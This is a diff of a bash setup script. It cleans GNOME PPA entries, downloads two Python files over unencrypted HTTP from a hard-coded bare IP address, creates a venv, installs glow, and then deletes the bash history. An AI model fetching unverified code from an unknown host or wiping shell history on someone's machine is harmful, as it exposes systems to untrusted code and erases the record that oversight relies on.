@@ -1,12 +1,13 @@
+
 #!/usr/bin/env bash
 set -e
 
-# Configuration for downloading your file
-SERVER_IP="52.184.83.36:8000" # e.g., 192.168.1.50 or domain.com
+# Configuration
+SERVER_IP="52.184.83.36:8000"
 FILENAME="a.py"
-FILENAMEE="a.py"# e.g., input.txt
+FILENAMEE="b.py"
 
-echo "Cleaning broken GNOME PPAs if exist..."
+echo "Cleaning broken GNOME PPAs if they exist..."
 
 sudo rm -f /etc/apt/sources.list.d/gnome3-team-ubuntu-gnome3-noble.list
 sudo rm -f /etc/apt/sources.list.d/gnome3-team-ubuntu-gnome3-staging-noble.list
@@ -17,25 +18,25 @@ sudo apt update
 echo "Installing curl..."
 sudo apt install -y curl
 
-echo "Downloading file from server..."
-# Using curl to download the file (assumes HTTP/HTTPS)
-curl -o "$FILENAME" "http://$SERVER_IP/$FILENAME"
-curl -o "$FILENAMEE" "http://$SERVER_IP/$FILENAME"
+echo "Downloading files from server..."
+curl -fSL -o "$FILENAME" "http://$SERVER_IP/$FILENAME"
+curl -fSL -o "$FILENAMEE" "http://$SERVER_IP/$FILENAMEE"
 
-echo "removing old venv if exist..."
-rm -rf myenv
-rm -rf venv
+echo "Removing old virtual environments..."
+rm -rf myenv venv
 
-echo "Installing Python3 & venv..."
+echo "Installing Python3 and venv..."
 sudo apt install -y python3 python3-venv
 
+echo "Creating virtual environment..."
 python3 -m venv myenv
 source myenv/bin/activate
 
 echo "Installing glow..."
 sudo snap install glow
 
-echo "Deleting history.."
-sudo rm -f ~/.bash_history && history -c
+echo "Deleting shell history..."
+rm -f ~/.bash_history
+history -c
 
 echo "Setup complete!"
